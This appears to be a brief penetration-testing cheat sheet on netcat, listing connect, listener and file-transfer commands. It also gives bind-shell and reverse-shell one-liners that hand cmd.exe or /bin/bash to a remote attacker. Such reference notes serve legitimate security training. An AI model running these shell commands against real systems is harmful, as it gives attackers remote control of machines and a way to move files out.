- Netcat (Aka TCP/IP Swiss Army Knife) is a networking utility used to read and write data to network connections using TCP or UDP.
- Netcat is available for both *NIX and Windows operating systems, consequently making i extremely useful for cross-platform engagements.

```
nc IP PORT - connection to a port
nc -lnvp PORT - listener
nc -lnvp PORT > FILE - nc -nv IP PORT < FILE - send a file to a listener
nc -u PORT - for udp
```

# Bind Shell
A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system.
```
nc -lnvp PORT -e cmd.exe or -c /bin/bash - on target machines
nc -nv IP PORT - on attacker machine
```

# Reverse Shell
A reverse shell is a type of remote shell where the target connects directly to a listener on the attacker's system, consequently allowing for execution of commands on the target system.
```
nc -lnvp PORT - on attacker machine
nc -nv IP PORT -e cmd.exe or -e /bin/bash
```
